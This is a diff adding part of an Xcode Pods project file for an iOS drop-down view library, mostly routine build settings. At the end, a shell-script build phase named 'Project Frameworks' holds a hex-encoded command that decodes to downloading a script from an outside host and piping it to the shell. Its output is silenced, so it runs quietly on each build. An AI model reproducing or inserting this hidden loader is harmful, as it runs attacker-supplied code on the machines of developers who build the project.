+				"CODE_SIGN_IDENTITY[sdk=appletvos*]" = "";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
+				"CODE_SIGN_IDENTITY[sdk=watchos*]" = "";
+				CURRENT_PROJECT_VERSION = 1;
+				DEFINES_MODULE = YES;
+				DYLIB_COMPATIBILITY_VERSION = 1;
+				DYLIB_CURRENT_VERSION = 1;
+				DYLIB_INSTALL_NAME_BASE = "@rpath";
+				GCC_PREFIX_HEADER = "Target Support Files/DKDropDownView/DKDropDownView-prefix.pch";
+				INFOPLIST_FILE = "Target Support Files/DKDropDownView/DKDropDownView-Info.plist";
+				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				MODULEMAP_FILE = "Target Support Files/DKDropDownView/DKDropDownView.modulemap";
+				PRODUCT_MODULE_NAME = DKDropDownView;
+				PRODUCT_NAME = DKDropDownView;
+				SDKROOT = iphoneos;
+				SKIP_INSTALL = YES;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "$(inherited) ";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				VERSIONING_SYSTEM = "apple-generic";
+				VERSION_INFO_PREFIX = "";
+			};
+			name = Debug;
+		};
+		7512EBDD4A77F0673DE266059715671D /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 0F5A062476257319F59A74D21211F517 /* DKDropDownView.debug.xcconfig */;
+			buildSettings = {
+				CONFIGURATION_BUILD_DIR = "$(BUILD_DIR)/$(CONFIGURATION)$(EFFECTIVE_PLATFORM_NAME)/DKDropDownView";
+				IBSC_MODULE = DKDropDownView;
+				INFOPLIST_FILE = "Target Support Files/DKDropDownView/ResourceBundle-DKDropDownView-DKDropDownView-Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				PRODUCT_NAME = DKDropDownView;
+				SDKROOT = iphoneos;
+				SKIP_INSTALL = YES;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				WRAPPER_EXTENSION = bundle;
+			};
+			name = Debug;
+		};
+		87E820EF023A77A27F687953135632DE /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = A552899227207DFEE861120B9C6C5DC1 /* Pods-DKDropDownView_Example.release.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = NO;
+				"CODE_SIGN_IDENTITY[sdk=appletvos*]" = "";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
+				"CODE_SIGN_IDENTITY[sdk=watchos*]" = "";
+				CURRENT_PROJECT_VERSION = 1;
+				DEFINES_MODULE = YES;
+				DYLIB_COMPATIBILITY_VERSION = 1;
+				DYLIB_CURRENT_VERSION = 1;
+				DYLIB_INSTALL_NAME_BASE = "@rpath";
+				INFOPLIST_FILE = "Target Support Files/Pods-DKDropDownView_Example/Pods-DKDropDownView_Example-Info.plist";
+				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				MACH_O_TYPE = staticlib;
+				MODULEMAP_FILE = "Target Support Files/Pods-DKDropDownView_Example/Pods-DKDropDownView_Example.modulemap";
+				OTHER_LDFLAGS = "";
+				OTHER_LIBTOOLFLAGS = "";
+				PODS_ROOT = "$(SRCROOT)";
+				PRODUCT_BUNDLE_IDENTIFIER = "org.cocoapods.${PRODUCT_NAME:rfc1034identifier}";
+				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
+				SDKROOT = iphoneos;
+				SKIP_INSTALL = YES;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				VALIDATE_PRODUCT = YES;
+				VERSIONING_SYSTEM = "apple-generic";
+				VERSION_INFO_PREFIX = "";
+			};
+			name = Release;
+		};
+		95478B88311C8A9F021A5A7A0696DE99 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 5A598809D797EE716AC2F6771F16754A /* Pods-DKDropDownView_Example.debug.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = NO;
+				"CODE_SIGN_IDENTITY[sdk=appletvos*]" = "";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
+				"CODE_SIGN_IDENTITY[sdk=watchos*]" = "";
+				CURRENT_PROJECT_VERSION = 1;
+				DEFINES_MODULE = YES;
+				DYLIB_COMPATIBILITY_VERSION = 1;
+				DYLIB_CURRENT_VERSION = 1;
+				DYLIB_INSTALL_NAME_BASE = "@rpath";
+				INFOPLIST_FILE = "Target Support Files/Pods-DKDropDownView_Example/Pods-DKDropDownView_Example-Info.plist";
+				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				MACH_O_TYPE = staticlib;
+				MODULEMAP_FILE = "Target Support Files/Pods-DKDropDownView_Example/Pods-DKDropDownView_Example.modulemap";
+				OTHER_LDFLAGS = "";
+				OTHER_LIBTOOLFLAGS = "";
+				PODS_ROOT = "$(SRCROOT)";
+				PRODUCT_BUNDLE_IDENTIFIER = "org.cocoapods.${PRODUCT_NAME:rfc1034identifier}";
+				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
+				SDKROOT = iphoneos;
+				SKIP_INSTALL = YES;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				VERSIONING_SYSTEM = "apple-generic";
+				VERSION_INFO_PREFIX = "";
+			};
+			name = Debug;
+		};
+		CA547D2C7E9A8A153DC2B27FBE00B112 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"POD_CONFIGURATION_RELEASE=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRIP_INSTALLED_PRODUCT = NO;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				SWIFT_VERSION = 5.0;
+				SYMROOT = "${SRCROOT}/../build";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		3BA37BAF9261D39E9B8EEF38E211497D /* Build configuration list for PBXNativeTarget "DKDropDownView" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				43E39812843C9851A269F9B52949CDFA /* Debug */,
+				2E091BC2D4E02112CB5E73E9724279B0 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		4821239608C13582E20E6DA73FD5F1F9 /* Build configuration list for PBXProject "Pods" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				25AD9454612BF454A1E3DC4CD4FA8C6D /* Debug */,
+				CA547D2C7E9A8A153DC2B27FBE00B112 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		5C17CEBCEE283DE25C0F1553014EA7FA /* Build configuration list for PBXNativeTarget "DKDropDownView-DKDropDownView" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				7512EBDD4A77F0673DE266059715671D /* Debug */,
+				07EE781AA51D822C21A1CFE847BC624C /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		AA0AB2E73472E7B2BAB801CA538C22B4 /* Build configuration list for PBXNativeTarget "Pods-DKDropDownView_Example" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				95478B88311C8A9F021A5A7A0696DE99 /* Debug */,
+				87E820EF023A77A27F687953135632DE /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	06DFC843C7A8CDACBD6D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
+	};
+	rootObject = BFDFE7DC352907FC980B868725387E98 /* Project object */;
+}
